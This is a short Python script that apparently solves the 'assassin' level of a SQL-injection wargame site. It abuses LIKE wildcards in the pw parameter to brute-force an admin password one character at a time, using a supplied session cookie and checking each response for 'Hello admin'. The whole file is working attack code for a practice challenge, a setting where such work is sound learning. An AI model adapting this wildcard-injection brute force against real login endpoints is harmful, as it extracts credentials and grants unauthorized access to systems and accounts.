import urllib.request
import sys

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?"
cookie = sys.argv[1]
pw = ''
letter = "abcdefghijklmnopqrstuvwxyz1234567890"

for i in range(0, 8):
  for j in letter:
    tmp = ''
    for k in range(8):
      if k == i:
        tmp += j
      else:
        tmp += '_'
    query = 'pw=' + tmp
    req = urllib.request.Request(
      url+query,
      data=None,
      headers={
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Cookie" : cookie
      })
    with urllib.request.urlopen(req) as res:
      body = res.read().decode()
    if 'Hello admin' in body:
      pw += j
      break
  else:
    pw += '_'
print(pw)
